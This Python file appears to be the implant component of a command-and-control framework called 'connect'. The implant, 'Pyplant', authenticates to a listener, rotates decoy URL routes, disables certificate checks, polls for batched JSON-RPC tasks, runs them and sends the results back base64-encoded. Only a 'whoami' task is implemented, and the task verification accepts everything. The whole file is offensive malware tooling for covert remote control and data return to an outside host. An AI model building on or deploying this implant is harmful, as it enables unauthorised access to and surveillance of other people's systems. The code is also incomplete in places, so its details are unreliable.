import base64
import json
import random
import requests
import subprocess
import select
import socket
import threading
import time

from connect.output import display
from connect.convert import bytes_to_base64, base64_to_bytes, string_to_base64


class Pyplant:
    NAME = 'pyplant'
    ROUTES = ['test', 'test1', '1test', '_test', 'test_', 'test?test=test', 'test.png']
    SLEEP = 0.01

    def __init__(self):
        self.listener_url = None
        self.check_in_task_id = None
        self.batch_request = []
        self.batch_response = []
        self.socks_connections = {}
        self.upstream_buffer = {}

    def authenticate_implant(self, listener_url: str, implant_key: str):
        route = self.ROUTES[random.randint(0, len(self.ROUTES) - 1)]
        implant_authentication = json.dumps({
            'jsonrpc': '2.0',
            'results': None,
            'id': implant_key
        })
        self.check_in_task_id = requests.post(f'{listener_url}/{route}', implant_authentication, verify=False).text

    def retrieve_batch_request(self, listener_url: str):
        while True:
            time.sleep(self.SLEEP)
            route = self.ROUTES[random.randint(0, len(self.ROUTES) - 1)]
            try:
                if len(self.batch_response) > 1:
                    display('Sending batch response:', 'INFORMATION')
                    display(json.dumps(self.batch_response))
                results = requests.post(f'{listener_url}/{route}', json.dumps(self.batch_response),
                                        verify=False).text
                self.batch_response = []
                self.batch_response.extend([
                    {
                        'jsonrpc': '2.0',
                        'results': None,
                        'id': self.check_in_task_id
                    }
                ])
            except Exception as e:
                display(f'Failed to parse batch request: {e}', 'ERROR')
                time.sleep(self.SLEEP)
                continue
            try:
                batch_request = json.loads(results)
            except json.decoder.JSONDecodeError:
                time.sleep(self.SLEEP)
                continue
            if len(batch_request) >= 1:
                display('Scheduling batch request:', 'INFORMATION')
                display(json.dumps(batch_request))
            self.batch_request.extend(batch_request)
            time.sleep(self.SLEEP)

    def run(self, arguments):
        self.authenticate_implant(arguments.url, arguments.key)
        if not self.check_in_task_id:
            display('Implant failed to authenticate', 'ERROR')
            return
        self.batch_response.extend([
            {
                'jsonrpc': '2.0',
                'results': None,
                'id': self.check_in_task_id
            }
        ])
        threading.Thread(target=self.retrieve_batch_request, daemon=True, args=(arguments.url,)).start()
        self.process_tasks()

    def process_tasks(self):
        while True:
            time.sleep(self.SLEEP)
            while self.batch_request:
                task = self.batch_request.pop(0)
                if not self.verify_task_format(task):
                    continue
                task_id = task.get('id')
                method = task.get('method')
                params = task.get('params')
                results = None
                if method == 'whoami':
                    results = subprocess.run(['whoami'], capture_output=True, text=True).stdout
                if task_id != self.check_in_task_id:
                    self.batch_response.extend([{
                        "jsonrpc": "0.0.0",
                        "result": self.string_to_base64(results) if results else None,
                        "id": task_id
                    }])

    @staticmethod
    def verify_task_format(task: dict) -> bool:
        return True

    @staticmethod
    def base64_to_string(data) -> str:
        """
        Base64 decode a string.
        :param data: A base64 string.
        :return: A base64 decoded string
        :rtype: str
        """
        return base64.b64decode(data.encode('utf-8')).decode('utf-8')

    @staticmethod
    def string_to_base64(data) -> str:
        """
        Base64 encode a string.
        :param data: A python string.
        :return: A base64 encoded string
        :rtype: str
        """
        return str(base64.b64encode(data.encode()), 'utf-8')